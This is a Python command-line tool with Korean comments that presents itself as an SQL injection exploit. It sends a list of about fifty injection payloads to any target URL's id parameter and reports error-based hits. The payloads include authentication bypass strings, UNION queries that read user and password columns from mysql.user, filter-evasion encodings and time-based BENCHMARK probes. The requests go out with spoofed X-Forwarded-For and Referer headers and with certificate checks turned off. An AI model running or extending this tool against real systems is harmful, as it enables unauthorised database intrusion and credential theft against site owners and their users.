import requests
import argparse
import urllib.parse
import warnings

# SSL 경고 무시
warnings.simplefilter('ignore', category=UserWarning)

# 기본 요청 헤더
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "https://google.com",
    "X-Forwarded-For": "127.0.0.1"
}

# **SQL Injection Exploit**
def exploit_sql_injection(target_url):
    """
    SQL Injection 자동 탐색 및 익스플로잇
    """

    # SQL Injection 페이로드 리스트 (확장 버전)
    sqli_payloads = [
        "admin'/*",
        "admin' or '1'='1",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "admin' or '1'='1'/*",
        "admin'or 1=1 or ''='",
        "admin' or 1=1",
        "admin' or 1=1--",
        "admin' or 1=1#",
        "admin' or 1=1/*",
        "admin') or ('1'='1",
        "admin') or ('1'='1'--",
        "admin') or ('1'='1'#",
        "admin') or ('1'='1'/*",
        "admin') or '1'='1",
        "admin') or '1'='1'--",
        "admin') or '1'='1'#",
        "admin') or '1'='1'/*",
        "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
        "admin\" --",
        "admin\" #",
        "1e1union select 1 //select user from mysql.user where user = 'root' and 1=1e1union select 1",
        "xx select xxx, 1e1from xxx //select user,password from mysql.user where user = 'root' and 1=1e1union select user,1e1from mysql.user;",
        "(select \"/*\") union all select xxx from xxx-- */",
        "1' u%nion se%lect 1 (iis asp)",
        "1' u%u006eion se%u006cect 1 (iis asp)",
        "1' \\Nunion select 1",
        "001100100010011100100000011101010110111001101001011011110110111000100000011100110110010101101100011001010110001101110100001000000011000100101100001100100010110000110011001011000111010101110011011001010111001000101000001010010010110000110101001011000011011000100000011001100111001001101111011011010010000000100011",
        "?id=74+u%nion+s%elect 1,2,3,4,5,6 from",
        "select{x table_name}from{x information_schema.tables}",
        "SELECT(UNHEX(UNHEX(333532453335324533323335)));",
        "' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '",
        "select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0",
        "select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0",
        "select * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0",
        "where id=.1union/*.1*/select-.1",
        "where id=.1union/*.1*/select!.1",
        "where id=.1union/*.1*/select~.1",
        "where id=.1union/*.1*/select(1)",
        "where id=.1union/*.1*/select`host`from mysql.user",
        "where id=.1union/*.1*/select'1'",
        "where id=.1union/*.1*/select\"1\"",
        "where id=.1union/*.1*/select@1",
        "' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '",
        "select * from user where host ='localhost' && 0=0 limit 0,1;",
        "select * from user where host ='localhost' || 1=1 limit 0,1;",
        "select * from(user);",
        "select * from`user`;",
        "'and(true)like(false)union(select(pass)from(users))#",
        "'union [all|distinct] select pass from users#",
        "SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))"
    ]

    print(f"\n[*] Starting SQL Injection Scan on: {target_url}\n")
    vulnerable = False

    # 각 페이로드 테스트
    for payload in sqli_payloads:
        try:
            encoded_payload = urllib.parse.quote(payload)  # URL 인코딩
            exploit_url = f"{target_url}?id={encoded_payload}"

            response = requests.get(exploit_url, headers=HEADERS, verify=False, allow_redirects=False, timeout=10)
            
            print(f"[DEBUG] Testing payload: {payload}")

            # SQL 오류 메시지 확인 (Error-Based SQLi 탐지)
            if any(error in response.text.lower() for error in [
                "syntax error", "mysql", "sql", "query failed", "you have an error in your sql syntax"
            ]):
                print("\n[🔥] SQL Injection vulnerability detected!")
                print(f"[*] Payload: {payload}")
                print("[DEBUG] Response:", response.text[:500])  # 응답이 너무 길 경우 앞 500자 출력
                vulnerable = True
                break  # 첫 번째 취약점 발견 시 종료

        except requests.exceptions.RequestException as err:
            print(f"[ERROR] {err}")
            continue

    if not vulnerable:
        print("[❌] No SQL Injection vulnerability found.")

# 메인 함수
def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Exploit Tool",
        usage="python3 sqli_exploit.py --url <URL>"
    )
    parser.add_argument("--url", required=True, help="Target URL")

    args = parser.parse_args()

    print("[INFO] Starting SQL Injection Exploit...")
    exploit_sql_injection(args.url)

if __name__ == "__main__":
    main()
